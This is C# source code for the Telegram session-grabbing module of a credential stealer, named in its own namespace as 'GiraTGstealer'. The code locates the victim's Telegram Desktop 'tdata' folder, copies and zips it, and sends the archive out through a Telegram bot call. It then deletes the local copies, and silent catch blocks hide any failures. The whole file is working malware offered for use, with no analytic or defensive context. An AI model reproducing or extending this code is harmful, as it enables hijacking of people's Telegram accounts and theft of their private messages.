using System;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;

namespace GiraTGstealer.stealer
{
    internal class TelegramGrabber
    {
        private static bool in_folder = false;

        public static void get()
        {
            string tdataPath;
            Process[] process = Process.GetProcessesByName("Telegram");
            if(process.Length > 0)
            {
                tdataPath = Path.GetDirectoryName(process[0].MainModule.FileName) + "\\tdata\\";
                //Tg send text?
                steal(tdataPath);
            }
            else
            {
                tdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\";
                if(Directory.Exists(tdataPath))
                {
                    //tg send text?
                    steal(tdataPath);
                }
                else
                {
                    //tg send text
                }
            }
        }
        private static void steal(string tdata)
        {
            string dirPath = Path.GetDirectoryName(config.InstallPath) + "\\tdata";
            string archivePath = dirPath + ".zip";
            if(!Directory.Exists(tdata)) 
            {
                //tg send text?
                return;
            }
            Directory.CreateDirectory(dirPath);
            CopyAll(tdata, dirPath);
            ZipFile.CreateFromDirectory(dirPath, archivePath);
            telegram.sendFile(archivePath);
            File.Delete(archivePath);
            Directory.Delete(dirPath, true);
        }

        private static void CopyAll(string fromDir, string toDir)
        {
            foreach (string s1 in Directory.GetFiles(fromDir))
            {
                CopyFile(s1, toDir);
            }
            foreach (string s in Directory.GetDirectories(fromDir))
                CopyDir(s, toDir);
        }
        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);
                if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;
                var s2 = toDir + "\\" + fname;
                File.Copy(s1, s2);
            }
            catch { }
        }


        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_folder = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_folder = false;
            }
            catch { }
        }

    }
}
